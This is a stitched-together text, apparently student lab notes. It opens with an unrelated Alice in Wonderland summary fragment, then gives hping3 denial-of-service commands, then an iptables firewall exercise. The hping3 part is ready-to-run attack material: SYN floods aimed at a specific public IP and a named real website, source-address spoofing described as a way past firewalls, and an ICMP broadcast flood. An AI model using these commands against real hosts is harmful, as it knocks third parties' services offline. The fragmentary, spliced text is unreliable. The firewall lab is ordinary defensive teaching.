She finds a small key to a door too small for her to fit, but through which she sees an attractive garden. She then discovers a bottle labelled 'DRINK ME', the contents of which cause her to shrink too small to reach the key. A cake with 'EAT ME' on it causes her to grow to such a tremendous size her head hits the ceiling.", "Alice comes upon a mushroom and sitting on it is a blue Caterpillar smoking a hookah. The Caterpillar questions Alice and she admits to her current identity crisis, compounded by her inability to remember a poem. Before crawling away, the caterpillar tells Alice that one side of the mushroom will make her taller and the other side will make her shorter. She breaks off two pieces from the mushroom. One side makes her shrink smaller than ever, while another causes her neck to grow high into the trees, where a pigeon mistakes her for a serpent. With some effort, Alice brings herself back to her usual height. She stumbles upon a small estate and uses the mushroom to reach a more appropriate height."];

Hping3

1. sudo apt install hping3 -y

///
A simple DOS (not DDOS) attack would be:

2. sudo hping3 -S --flood -V -p 80 170.155.9.185

sudo: gives needed privileges to run hping3. 
hping3: calls hping3 program. 
-S: specifies SYN packets. 
–flood: replies will be ignored and packets will be sent as fast as possible. 
-V: Verbosity. 
-p 80: port 80 
-170.155.9.185: target IP.

Flood Using SYN Packets Against Port 80 SYN packets include the connection synchronization confirmation request. The following example shows a SYN attack against lacampora.org:

eg: sudo hping3 lacampora.org -q -n -d 120 -S -p 80 --flood --rand-source

///
Flood From a Fake IP Address With hping3 With hping3 you can also attack your targets with a fake IP. In order to bypass a firewall, you can even clone your target IP itself, or any allowed address you may know (you can achieve it for example with Nmap or a sniffer to listen to established connections).

The syntax is the following:

2. sudo hping3 -a <FAKE IP> <target> -S -q -p 80
In the example below, I replaced my real IP address with the IP 190.0.174.10.

sudo hping3 -a 190.0.174.10 190.0.175.100 -S -q -p 80


///
Syn flood : hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159 
ICMP flood: hping3 -1 --flood -a 192.168.103 192.168.1.255

AIM: To study and configure Firewalls using IP tables

A firewall is a system designed to prevent unauthorized access to or from a private network. 
You can implement a firewall in either hardware or software form, or a combination of both. 
Generally the firewall has two network interfaces: one for the external side of the network, 
one for the internal side. Its purpose is to control what traffic is allowed to traverse from one 
side to the other. As the most basic level, firewalls can block traffic intended for particular 
IP addresses or server ports.

Types of Firewalls
Three basic types of network firewalls: packet filtering (stateless), stateful, and application 
layer.
Packet filtering, or stateless, firewalls work by inspecting individual packets in isolation. 
As such, they are unaware of connection state and can only allow or deny packets based on 
individual packet headers.
Stateful firewalls are able to determine the connection state of packets, which makes them 
much more flexible than stateless firewalls. They work by collecting related packets until 
the connection state can be determined before any firewall rules are applied to the traffic.
Application firewalls go one step further by analyzing the data being transmitted, which 
allows network traffic to be matched against firewall rules that are specific to individual 
services or applications. These are also known as proxy-based firewalls.

sudo iptables -L
(-L - List the current filter rules. )

sudo iptables -A INPUT -p tcp --dport ssh -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT  
sudo iptables -A INPUT -j DROP
sudo iptables -L
sudo iptables -I INPUT 1 -i lo -j ACCEPT
sudo iptables -L
sudo iptables -L -v

Allow traffic on ICMP port
sudo iptables -A INPUT -p icmp -j ACCEPT
now list the rules again..
sudo iptables -L

Dropping icmp packets
try to ping ur neighbour machine
ping 192.168.92.17
u can see the response packets received.
Now block incoming icmp packets from the neighbour using command:
sudo iptables -A INPUT -p icmp -j DROP
list the rule:
sudo iptables -L
try to ping ur neighbour machine again
ping 192.168.92.17
u can not see receive icmp echo reply packets..
